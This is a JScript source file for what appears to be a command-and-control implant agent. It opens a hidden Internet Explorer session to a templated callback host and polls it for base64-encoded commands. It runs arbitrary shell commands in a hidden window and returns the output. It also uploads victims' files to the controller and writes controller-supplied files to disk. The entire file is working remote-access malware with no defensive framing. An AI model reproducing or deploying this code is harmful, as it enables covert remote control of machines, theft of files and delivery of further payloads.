//------------------------------------------------------------------------------------------------
var ie = new ActiveXObject("InternetExplorer.Application");
var sh = new ActiveXObject("WScript.Shell");
var hf = new ActiveXObject("htmlfile");
ie.visible = false;
var done = false;
var prefix = "${prefix}";
ie.navigate("${callbackURL}:${port}/index.html");

// Wait for IE to be ready, ie DOM completely loaded
while (ie.ReadyState<4) { WScript.Sleep(100);}
var ieDocument = ie.document;

//------------------------------------------------------------------------------------------------
// MAIN
//------------------------------------------------------------------------------------------------
try {
	// Map all DOM document elements that we're using in order to interact with Internet Explorer
	var button = ieDocument.getElementById(prefix + "Button");
	var input = ieDocument.getElementById(prefix + "Input");
	var output = ieDocument.getElementById(prefix + "Output");
	
	//--------------------------------------------------------------
	// Loop, waiting for new commands from the controller
	//--------------------------------------------------------------
	while(!done) {
		if (input.innerText != "")
		{
			var inputParameters = input.innerText.split("|");
			var command = decodeBase64(inputParameters[0]);
			// Reseting input value, to get ready to get more commands
			input.innerText = "";

			//-----------------------------------------------------
			// Treat each command case
			switch(command) {
				//--- Command line
				case "cli":
					var cli = decodeBase64(inputParameters[1]);
					
					// Execute the cli in a hidden window
					sh.Run("cmd.exe /c " + cli + " 2>&1 | clip.exe", 0, true);

					//-----------------------------------------------------------------------------
					// Retrieve result from the clipboard
					var result = hf.parentWindow.clipboardData.getData('text');
					
					// Store the resulting output into the corresponding div
					output.innerText = encodeBase64(result);
					break;
				
				//--- Transfer file from agent to C2
				case "tfa2c2":
					var fileName = decodeBase64(inputParameters[1]);
					try {
						output.innerText = fromBytesToBase64(readBytes(fileName));
					}
					catch (e) {
						output.innerText = encodeBase64("Error reading file: [" + e.message + "]");
					}
					break;
				
				//--- Transfer file from C2 to agent
				case "tfc22a":
						var fileBytes = fromBase64ToBytes(inputParameters[1]);
						var destinationPath = decodeBase64(inputParameters[2]);
						var fileName = decodeBase64(inputParameters[3]);
						if (destinationPath == "temp") { destinationPath = sh.ExpandEnvironmentStrings("%TEMP%") + "\\"; }
						try {
							writeBytes(destinationPath + fileName, fileBytes);
							output.innerText = encodeBase64("File transfered successfully");
						}
						catch (e) {
							output.innerText = encodeBase64("Error writing file: [" + e.message + "]");
						}
					break;

				//--- Exit
				case "stop":
					output.innerText = encodeBase64("Agent terminating...");
					done = true;
					break;
			}
			// Call a button click to send the data back to the C2 server over the WebSocket
			button.click();
		}
		else WScript.Sleep(100);
	}
}
//catch(e) {
//	WScript.Echo(e.message);
//	ie.Quit();
//}
finally {
	ie.Quit();
}

//====================================================================
// Helper functions
// base64/conversion from https://stackoverflow.com/questions/496751/base64-encode-string-in-vbscript
//====================================================================
function BytesToStr(byteArray) {
	var result;
	var adoStream = new ActiveXObject("ADODB.Stream");
        
	adoStream.Type = 1 // adTypeBinary
	adoStream.Open();
	adoStream.Write(byteArray);
	
	adoStream.Position = 0
	adoStream.Type = 2 // adTypeText
	adoStream.CharSet = "utf-8";
	result = adoStream.ReadText();
	adoStream.close();
    return result;
}

function StrToBytes(data) {
	var result;
    var adoStream = new ActiveXObject("ADODB.Stream");
	
    adoStream.Type = 2;  // adTypeText
    adoStream.Charset = "utf-8";
    adoStream.Open();
    adoStream.WriteText(data);
        
	adoStream.Position = 0; 
	adoStream.Type = 1;  // adTypeBinary
	//adoStream.Position = iBomByteCount ' skip the BOM
	result = adoStream.Read();
	adoStream.close();
	return result;
}

function decodeBase64(base64) {
	var xmlDom = new ActiveXObject("Microsoft.XMLDOM");
 	var docElement = xmlDom.createElement("tmp");
	docElement.dataType = "bin.base64";
	docElement.text = base64;
	return BytesToStr(docElement.nodeTypedValue);
}

function fromBase64ToBytes(base64) {
	var xmlDom = new ActiveXObject("Microsoft.XMLDOM");
 	var docElement = xmlDom.createElement("tmp");
	docElement.dataType = "bin.base64";
	docElement.text = base64;
	return docElement.nodeTypedValue;
}

function fromBytesToBase64(data) {
	var xmlDom = new ActiveXObject("Microsoft.XMLDOM");
	var docElement = xmlDom.createElement("tmp");
	docElement.dataType = "bin.base64";
	docElement.nodeTypedValue = data;
	return docElement.text;
}

function encodeBase64(data) {
	var xmlDom = new ActiveXObject("Microsoft.XMLDOM");
	var docElement = xmlDom.createElement("tmp");
	docElement.dataType = "bin.base64";
	docElement.nodeTypedValue = StrToBytes(data);
	return docElement.text;
}

function readBytes(filePath) {
  var inStream = new ActiveXObject("ADODB.Stream");
  inStream.Open();
  inStream.type = 1; // adTypeBinary
  inStream.LoadFromFile(filePath);
  return inStream.Read();
}

function writeBytes(filePath, bytes) {
	var outStream = new ActiveXObject("ADODB.Stream");
	outStream.Type = 1; // adTypeBinary
	outStream.Open();
	outStream.Write(bytes);
	//Save binary data to disk
	outStream.SaveToFile(filePath, 2);
}
